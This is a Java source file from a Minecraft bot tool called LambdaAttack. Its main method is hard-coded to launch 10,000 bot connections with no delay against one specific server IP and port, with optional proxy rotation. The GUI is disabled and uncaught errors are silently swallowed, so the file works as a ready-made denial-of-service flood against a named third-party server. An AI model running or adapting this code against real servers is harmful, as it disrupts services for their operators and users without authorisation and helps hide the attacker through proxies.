package com.github.games647.lambdaattack;

import com.github.games647.lambdaattack.bot.Bot;
import com.github.games647.lambdaattack.gui.MainGui;

import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.spacehq.mc.auth.exception.request.RequestException;

public class LambdaAttack {

    public static final String PROJECT_NAME = "LambdaAttack";

    private static LambdaAttack instance;
    private static final Logger LOGGER = Logger.getLogger(PROJECT_NAME);

    public static Logger getLogger() {
        return Logger.getAnonymousLogger();
    }

    public static LambdaAttack getInstance() {
        return instance;
    }

    public static void main(String[] args) throws RequestException {
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
            //LOGGER.log(Level.SEVERE, null, throwable);
        });
       instance = new LambdaAttack();
            start("158.69.120.219",25565,10000,0,"Bot%d");
        
    }

    //private final MainGui mainGui = new MainGui(this);

    private static boolean running = false;
    private static GameVersion gameVersion = GameVersion.VERSION_1_10;

    private static List<Proxy> proxies;
    private static List<String> names;

    private boolean autoRegister = false;

    private static final List<Bot> clients = new ArrayList<>();
    private static final ExecutorService threadPool = Executors.newCachedThreadPool();
static int runned = 0;
    public static void start(String host, int port, int amount, int delay, String nameFormat) throws RequestException {
        running = true;
        
        for (int i = 0; i < amount; i++) {
            String username = String.format(nameFormat, i);
            if (names != null) {
                if (names.size() <= i) {
                    LOGGER.warning("Amount is higher than the name list size. Limitting amount size now...");
                    break;
                }

                username = names.get(i);
            }

            UniversalProtocol account = authenticate(username, "");

            Bot bot;
            if (proxies != null) {
                Proxy proxy = proxies.get(i % proxies.size());
                bot = new Bot(account, proxy);
            } else {
                bot = new Bot(account);
            }

            clients.add(bot);
        }

        clients.parallelStream().forEach(client->{
            if (!running) {
                return;
            }

            try {
                System.out.println(++runned);
                client.connect(host, port);
            } catch (RequestException ex) {
                Logger.getLogger(LambdaAttack.class.getName()).log(Level.SEVERE, null, ex);
            }
                });
    }

    public static UniversalProtocol authenticate(String username, String password) throws RequestException {
        UniversalProtocol protocol;
        if (!password.isEmpty()) {
            throw new UnsupportedOperationException("Not implemented");
//            protocol = new MinecraftProtocol(username, password);
//            LOGGER.info("Successfully authenticated user");
        } else {
            protocol = UniversalFactory.authenticate(gameVersion, username);
        }

        return protocol;
    }

    public void setProxies(List<Proxy> proxies) {
        this.proxies = proxies;
    }

    public void setNames(List<String> names) {
        this.names = names;
    }

    public GameVersion getGameVersion() {
        return gameVersion;
    }

    public void setGameVersion(GameVersion gameVersion) {
        this.gameVersion = gameVersion;
    }

    public void stop() {
        this.running = false;
        clients.stream().forEach(Bot::disconnect);
        clients.clear();
    }

    public ExecutorService getThreadPool() {
        return threadPool;
    }

    public boolean isAutoRegister() {
        return autoRegister;
    }

    public void setAutoRegister(boolean autoRegister) {
        this.autoRegister = autoRegister;
    }
}
